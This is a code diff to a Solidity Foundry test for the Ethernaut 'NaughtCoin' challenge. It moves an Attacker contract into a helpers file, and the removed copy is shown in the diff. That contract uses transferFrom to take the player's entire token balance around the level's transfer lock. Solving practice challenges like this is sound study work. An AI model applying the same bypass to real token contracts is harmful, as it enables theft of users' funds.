@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";
+import {Attacker} from "~/helpers/NaughtCoin.sol";
 
 contract NaughtCoinTest is Test {
     NaughtCoin target;
@@ -30,19 +31,5 @@ contract NaughtCoinTest is Test {
         vm.stopPrank();
 
         assertEq(target.balanceOf(player), 0, "player must have no tokens");
-    }
-}
-
-contract Attacker {
-    NaughtCoin target;
-    address owner;
-
-    constructor(address _target) {
-        owner = msg.sender;
-        target = NaughtCoin(_target);
-    }
-
-    function transfer() external {
-        target.transferFrom(owner, address(this), target.balanceOf(owner));
     }
 }
